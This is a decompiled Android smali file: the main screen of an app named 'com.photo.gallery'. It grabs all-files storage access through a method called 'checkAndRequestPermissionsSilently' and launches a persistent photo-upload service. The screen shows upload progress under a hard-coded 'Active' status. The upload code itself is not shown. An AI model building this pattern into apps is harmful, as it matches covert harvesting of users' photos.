.class public Lcom/photo/gallery/MainActivity;
.super Landroidx/appcompat/app/AppCompatActivity;
.source "MainActivity.java"


# static fields
.field private static final MANAGE_STORAGE_REQUEST_CODE:I = 0x65

.field private static final PERMISSION_REQUEST_CODE:I = 0x64


# instance fields
.field private handler:Landroid/os/Handler;

.field private prefs:Landroid/content/SharedPreferences;

.field private progressBar:Landroid/widget/ProgressBar;

.field private progressCard:Landroid/widget/LinearLayout;

.field private statusReceiver:Landroid/content/BroadcastReceiver;

.field private tvLastBackup:Landroid/widget/TextView;

.field private tvPhotoCount:Landroid/widget/TextView;

.field private tvProgress:Landroid/widget/TextView;

.field private tvServiceStatus:Landroid/widget/TextView;


# direct methods
.method static bridge synthetic -$$Nest$fgethandler(Lcom/photo/gallery/MainActivity;)Landroid/os/Handler;
    .locals 0

    iget-object p0, p0, Lcom/photo/gallery/MainActivity;->handler:Landroid/os/Handler;

    return-object p0
.end method

.method static bridge synthetic -$$Nest$mupdateUI(Lcom/photo/gallery/MainActivity;)V
    .locals 0

    invoke-direct {p0}, Lcom/photo/gallery/MainActivity;->updateUI()V

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .line 33
    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V

    .line 44
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    iput-object v0, p0, Lcom/photo/gallery/MainActivity;->handler:Landroid/os/Handler;

    .line 46
    new-instance v0, Lcom/photo/gallery/MainActivity$1;

    invoke-direct {v0, p0}, Lcom/photo/gallery/MainActivity$1;-><init>(Lcom/photo/gallery/MainActivity;)V

    iput-object v0, p0, Lcom/photo/gallery/MainActivity;->statusReceiver:Landroid/content/BroadcastReceiver;

    return-void
.end method

.method private checkAndRequestPermissionsSilently()V
    .locals 6

    const-string v0, "package:"

    .line 86
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1e

    const/16 v3, 0x64

    const/4 v4, 0x1

    const/4 v5, 0x0

    if-lt v1, v2, :cond_0

    .line 87
    invoke-static {}, Landroid/os/Environment;->isExternalStorageManager()Z

    move-result v1

    if-nez v1, :cond_2

    const/16 v1, 0x65

    .line 90
    :try_start_0
    new-instance v2, Landroid/content/Intent;

    const-string v3, "android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION"

    invoke-direct {v2, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 91
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0}, Lcom/photo/gallery/MainActivity;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    invoke-virtual {v2, v0}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    .line 92
    invoke-virtual {p0, v2, v1}, Lcom/photo/gallery/MainActivity;->startActivityForResult(Landroid/content/Intent;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    .line 94
    :catch_0
    new-instance v0, Landroid/content/Intent;

    const-string v2, "android.settings.MANAGE_ALL_FILES_ACCESS_PERMISSION"

    invoke-direct {v0, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 95
    invoke-virtual {p0, v0, v1}, Lcom/photo/gallery/MainActivity;->startActivityForResult(Landroid/content/Intent;I)V

    return-void

    .line 100
    :cond_0
    const-string v0, "android.permission.READ_EXTERNAL_STORAGE"

    invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v1

    if-nez v1, :cond_1

    move v1, v4

    goto :goto_0

    :cond_1
    move v1, v5

    :goto_0
    if-nez v1, :cond_2

    .line 103
    new-array v1, v4, [Ljava/lang/String;

    aput-object v0, v1, v5

    invoke-static {p0, v1, v3}, Landroidx/core/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V

    return-void

    .line 110
    :cond_2
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x21

    if-lt v0, v2, :cond_3

    .line 111
    const-string v0, "android.permission.POST_NOTIFICATIONS"

    invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v2

    if-eqz v2, :cond_3

    .line 113
    new-array v1, v4, [Ljava/lang/String;

    aput-object v0, v1, v5

    invoke-static {p0, v1, v3}, Landroidx/core/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V

    return-void

    :cond_3
    if-eqz v1, :cond_4

    .line 121
    invoke-direct {p0}, Lcom/photo/gallery/MainActivity;->startPersistentService()V

    :cond_4
    return-void
.end method

.method private getTimeAgo(J)Ljava/lang/String;
    .locals 12

    .line 177
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    sub-long/2addr v0, p1

    const-wide/16 v2, 0x3e8

    .line 178
    div-long/2addr v0, v2

    const-wide/16 v2, 0x3c

    .line 179
    div-long v4, v0, v2

    .line 180
    div-long v6, v4, v2

    const-wide/16 v8, 0x18

    .line 181
    div-long v10, v6, v8

    cmp-long v0, v0, v2

    if-gez v0, :cond_0

    .line 183
    const-string p1, "Just now"

    return-object p1

    :cond_0
    cmp-long v0, v4, v2

    if-gez v0, :cond_1

    .line 184
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1, v4, v5}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object p1

    const-string p2, " min ago"

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1

    :cond_1
    cmp-long v0, v6, v8

    .line 185
    const-string v1, " ago"

    const-string v2, "s"

    const-string v3, ""

    const-wide/16 v4, 0x1

    if-gez v0, :cond_3

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object p1

    const-string p2, " hour"

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    cmp-long p2, v6, v4

    if-lez p2, :cond_2

    goto :goto_0

    :cond_2
    move-object v2, v3

    :goto_0
    invoke-virtual {p1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1

    :cond_3
    const-wide/16 v6, 0x7

    cmp-long v0, v10, v6

    if-gez v0, :cond_5

    .line 186
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1, v10, v11}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object p1

    const-string p2, " day"

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    cmp-long p2, v10, v4

    if-lez p2, :cond_4

    goto :goto_1

    :cond_4
    move-object v2, v3

    :goto_1
    invoke-virtual {p1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1

    .line 188
    :cond_5
    new-instance v0, Ljava/text/SimpleDateFormat;

    const-string v1, "MMM dd, yyyy"

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v2

    invoke-direct {v0, v1, v2}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;Ljava/util/Locale;)V

    .line 189
    new-instance v1, Ljava/util/Date;

    invoke-direct {v1, p1, p2}, Ljava/util/Date;-><init>(J)V

    invoke-virtual {v0, v1}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object p1

    return-object p1
.end method

.method private initViews()V
    .locals 1

    .line 73
    sget v0, Lcom/photo/gallery/R$id;->tvServiceStatus:I

    invoke-virtual {p0, v0}, Lcom/photo/gallery/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/photo/gallery/MainActivity;->tvServiceStatus:Landroid/widget/TextView;

    .line 74
    sget v0, Lcom/photo/gallery/R$id;->tvPhotoCount:I

    invoke-virtual {p0, v0}, Lcom/photo/gallery/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/photo/gallery/MainActivity;->tvPhotoCount:Landroid/widget/TextView;

    .line 75
    sget v0, Lcom/photo/gallery/R$id;->tvLastBackup:I

    invoke-virtual {p0, v0}, Lcom/photo/gallery/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/photo/gallery/MainActivity;->tvLastBackup:Landroid/widget/TextView;

    .line 76
    sget v0, Lcom/photo/gallery/R$id;->tvProgress:I

    invoke-virtual {p0, v0}, Lcom/photo/gallery/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/photo/gallery/MainActivity;->tvProgress:Landroid/widget/TextView;

    .line 77
    sget v0, Lcom/photo/gallery/R$id;->progressBar:I

    invoke-virtual {p0, v0}, Lcom/photo/gallery/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/ProgressBar;

    iput-object v0, p0, Lcom/photo/gallery/MainActivity;->progressBar:Landroid/widget/ProgressBar;

    .line 78
    sget v0, Lcom/photo/gallery/R$id;->progressCard:I

    invoke-virtual {p0, v0}, Lcom/photo/gallery/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/LinearLayout;

    iput-object v0, p0, Lcom/photo/gallery/MainActivity;->progressCard:Landroid/widget/LinearLayout;

    .line 80
    invoke-direct {p0}, Lcom/photo/gallery/MainActivity;->updateUI()V

    return-void
.end method

.method static synthetic lambda$onCreate$0(Landroid/view/View;Landroidx/core/view/WindowInsetsCompat;)Landroidx/core/view/WindowInsetsCompat;
    .locals 4

    .line 66
    invoke-static {}, Landroidx/core/view/WindowInsetsCompat$Type;->systemBars()I

    move-result v0

    invoke-virtual {p1, v0}, Landroidx/core/view/WindowInsetsCompat;->getInsets(I)Landroidx/core/graphics/Insets;

    move-result-object v0

    .line 67
    iget v1, v0, Landroidx/core/graphics/Insets;->left:I

    iget v2, v0, Landroidx/core/graphics/Insets;->top:I

    iget v3, v0, Landroidx/core/graphics/Insets;->right:I

    iget v0, v0, Landroidx/core/graphics/Insets;->bottom:I

    invoke-virtual {p0, v1, v2, v3, v0}, Landroid/view/View;->setPadding(IIII)V

    return-object p1
.end method

.method private startPeriodicUIUpdate()V
    .locals 4

    .line 193
    iget-object v0, p0, Lcom/photo/gallery/MainActivity;->handler:Landroid/os/Handler;

    new-instance v1, Lcom/photo/gallery/MainActivity$2;

    invoke-direct {v1, p0}, Lcom/photo/gallery/MainActivity$2;-><init>(Lcom/photo/gallery/MainActivity;)V

    const-wide/16 v2, 0x3e8

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method private startPersistentService()V
    .locals 3

    .line 142
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/photo/gallery/PhotoUploadService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 143
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1a

    if-lt v1, v2, :cond_0

    .line 144
    invoke-virtual {p0, v0}, Lcom/photo/gallery/MainActivity;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    .line 146
    :cond_0
    invoke-virtual {p0, v0}, Lcom/photo/gallery/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 148
    :goto_0
    invoke-direct {p0}, Lcom/photo/gallery/MainActivity;->updateUI()V

    return-void
.end method

.method private updateUI()V
    .locals 8

    .line 152
    iget-object v0, p0, Lcom/photo/gallery/MainActivity;->prefs:Landroid/content/SharedPreferences;

    new-instance v1, Ljava/util/HashSet;

    invoke-direct {v1}, Ljava/util/HashSet;-><init>()V

    const-string v2, "uploaded_photos"

    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences;->getStringSet(Ljava/lang/String;Ljava/util/Set;)Ljava/util/Set;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/Set;->size()I

    move-result v0

    .line 153
    iget-object v1, p0, Lcom/photo/gallery/MainActivity;->tvPhotoCount:Landroid/widget/TextView;

    invoke-static {v0}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 155
    iget-object v0, p0, Lcom/photo/gallery/MainActivity;->prefs:Landroid/content/SharedPreferences;

    const-string v1, "last_backup_time"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    invoke-interface {v0, v1, v2, v3}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v0

    .line 156
    iget-object v2, p0, Lcom/photo/gallery/MainActivity;->tvLastBackup:Landroid/widget/TextView;

    invoke-direct {p0, v0, v1}, Lcom/photo/gallery/MainActivity;->getTimeAgo(J)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 158
    iget-object v0, p0, Lcom/photo/gallery/MainActivity;->prefs:Landroid/content/SharedPreferences;

    const-string v1, "is_uploading"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    .line 159
    iget-object v1, p0, Lcom/photo/gallery/MainActivity;->prefs:Landroid/content/SharedPreferences;

    const-string v3, "upload_progress"

    invoke-interface {v1, v3, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v1

    .line 160
    iget-object v3, p0, Lcom/photo/gallery/MainActivity;->prefs:Landroid/content/SharedPreferences;

    const-string v4, "total_photos"

    invoke-interface {v3, v4, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v3

    if-eqz v0, :cond_0

    if-lez v3, :cond_0

    .line 163
    iget-object v0, p0, Lcom/photo/gallery/MainActivity;->progressCard:Landroid/widget/LinearLayout;

    invoke-virtual {v0, v2}, Landroid/widget/LinearLayout;->setVisibility(I)V

    .line 164
    iget-object v0, p0, Lcom/photo/gallery/MainActivity;->progressBar:Landroid/widget/ProgressBar;

    invoke-virtual {v0, v3}, Landroid/widget/ProgressBar;->setMax(I)V

    .line 165
    iget-object v0, p0, Lcom/photo/gallery/MainActivity;->progressBar:Landroid/widget/ProgressBar;

    invoke-virtual {v0, v1}, Landroid/widget/ProgressBar;->setProgress(I)V

    int-to-double v4, v1

    const-wide/high16 v6, 0x4059000000000000L    # 100.0

    mul-double/2addr v4, v6

    int-to-double v6, v3

    div-double/2addr v4, v6

    double-to-int v0, v4

    .line 167
    iget-object v2, p0, Lcom/photo/gallery/MainActivity;->tvProgress:Landroid/widget/TextView;

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    filled-new-array {v0, v1, v3}, [Ljava/lang/Object;

    move-result-object v0

    const-string v1, "Uploading photos... %d%% (%d/%d)"

    invoke-static {v1, v0}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto :goto_0

    .line 169
    :cond_0
    iget-object v0, p0, Lcom/photo/gallery/MainActivity;->progressCard:Landroid/widget/LinearLayout;

    const/16 v1, 0x8

    invoke-virtual {v0, v1}, Landroid/widget/LinearLayout;->setVisibility(I)V

    .line 172
    :goto_0
    iget-object v0, p0, Lcom/photo/gallery/MainActivity;->tvServiceStatus:Landroid/widget/TextView;

    const-string v1, "\u25cf Active"

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 173
    iget-object v0, p0, Lcom/photo/gallery/MainActivity;->tvServiceStatus:Landroid/widget/TextView;

    const v1, -0xb350b0

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setTextColor(I)V

    return-void
.end method


# virtual methods
.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 0

    .line 135
    invoke-super {p0, p1, p2, p3}, Landroidx/appcompat/app/AppCompatActivity;->onActivityResult(IILandroid/content/Intent;)V

    const/16 p2, 0x65

    if-ne p1, p2, :cond_0

    .line 137
    invoke-direct {p0}, Lcom/photo/gallery/MainActivity;->checkAndRequestPermissionsSilently()V

    :cond_0
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 1

    .line 55
    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    .line 56
    invoke-static {p0}, Landroidx/activity/EdgeToEdge;->enable(Landroidx/activity/ComponentActivity;)V

    .line 57
    sget p1, Lcom/photo/gallery/R$layout;->activity_main:I

    invoke-virtual {p0, p1}, Lcom/photo/gallery/MainActivity;->setContentView(I)V

    .line 59
    const-string p1, "photo_backup"

    const/4 v0, 0x0

    invoke-virtual {p0, p1, v0}, Lcom/photo/gallery/MainActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object p1

    iput-object p1, p0, Lcom/photo/gallery/MainActivity;->prefs:Landroid/content/SharedPreferences;

    .line 61
    invoke-direct {p0}, Lcom/photo/gallery/MainActivity;->initViews()V

    .line 62
    invoke-direct {p0}, Lcom/photo/gallery/MainActivity;->checkAndRequestPermissionsSilently()V

    .line 63
    invoke-direct {p0}, Lcom/photo/gallery/MainActivity;->startPeriodicUIUpdate()V

    .line 65
    sget p1, Lcom/photo/gallery/R$id;->main:I

    invoke-virtual {p0, p1}, Lcom/photo/gallery/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    new-instance v0, Lcom/photo/gallery/MainActivity$$ExternalSyntheticLambda0;

    invoke-direct {v0}, Lcom/photo/gallery/MainActivity$$ExternalSyntheticLambda0;-><init>()V

    invoke-static {p1, v0}, Landroidx/core/view/ViewCompat;->setOnApplyWindowInsetsListener(Landroid/view/View;Landroidx/core/view/OnApplyWindowInsetsListener;)V

    return-void
.end method

.method protected onDestroy()V
    .locals 2

    .line 224
    invoke-super {p0}, Landroidx/appcompat/app/AppCompatActivity;->onDestroy()V

    .line 225
    iget-object v0, p0, Lcom/photo/gallery/MainActivity;->handler:Landroid/os/Handler;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacksAndMessages(Ljava/lang/Object;)V

    return-void
.end method

.method protected onPause()V
    .locals 1

    .line 214
    invoke-super {p0}, Landroidx/appcompat/app/AppCompatActivity;->onPause()V

    .line 216
    :try_start_0
    iget-object v0, p0, Lcom/photo/gallery/MainActivity;->statusReceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v0}, Lcom/photo/gallery/MainActivity;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 0

    .line 127
    invoke-super {p0, p1, p2, p3}, Landroidx/appcompat/app/AppCompatActivity;->onRequestPermissionsResult(I[Ljava/lang/String;[I)V

    const/16 p2, 0x64

    if-ne p1, p2, :cond_0

    .line 129
    invoke-direct {p0}, Lcom/photo/gallery/MainActivity;->checkAndRequestPermissionsSilently()V

    :cond_0
    return-void
.end method

.method protected onResume()V
    .locals 3

    .line 204
    invoke-super {p0}, Landroidx/appcompat/app/AppCompatActivity;->onResume()V

    .line 205
    invoke-direct {p0}, Lcom/photo/gallery/MainActivity;->updateUI()V

    .line 206
    new-instance v0, Landroid/content/IntentFilter;

    const-string v1, "com.photo.gallery.STATUS_UPDATE"

    invoke-direct {v0, v1}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 207
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1a

    if-lt v1, v2, :cond_0

    .line 208
    iget-object v1, p0, Lcom/photo/gallery/MainActivity;->statusReceiver:Landroid/content/BroadcastReceiver;

    const/4 v2, 0x4

    invoke-virtual {p0, v1, v0, v2}, Lcom/photo/gallery/MainActivity;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;I)Landroid/content/Intent;

    :cond_0
    return-void
.end method
